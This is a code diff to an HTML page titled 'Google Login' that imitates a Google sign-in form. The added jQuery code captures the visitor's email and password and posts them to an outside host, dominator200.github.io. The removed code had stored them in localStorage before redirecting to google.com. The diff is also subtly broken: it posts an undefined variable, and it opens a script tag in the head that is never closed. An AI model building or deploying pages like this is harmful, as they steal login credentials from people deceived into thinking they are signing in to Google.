@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="Style.css">
     <title>Google Login</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script>
 
 </head>
 <body>
@@ -29,21 +31,22 @@
         </form>
       </div>
     <script>
-                const form = document.getElementById('form');
-        const Email = document.getElementById('email');
+        const Emailadd = document.getElementById('email');
         const Password = document.getElementById('password');
-
-        form.addEventListener('submit', function(e) {
-          e.preventDefault();
-
-          const EmailValue = Email.value;
-          const PasswordValue = Password.value;
-
-          localStorage.setItem('e-mail', EmailValue);
-          localStorage.setItem('pass-word', PasswordValue);
-
-          window.location.href = "https://www.google.com"
-        })
-    </script>
+$(document).ready(function(){
+  $("button").click(function(){
+        const email = Emailadd.value;
+        const password = Password.value;
+    $.post("https://dominator200.github.io/Google-login/",
+    {
+      Email: emailadd,
+      Pass: password
+    },
+    function(data,status){
+      alert("Data: " + data + "\nStatus: " + status);
+    });
+  });
+});
+</script>
 </body>
 </html>
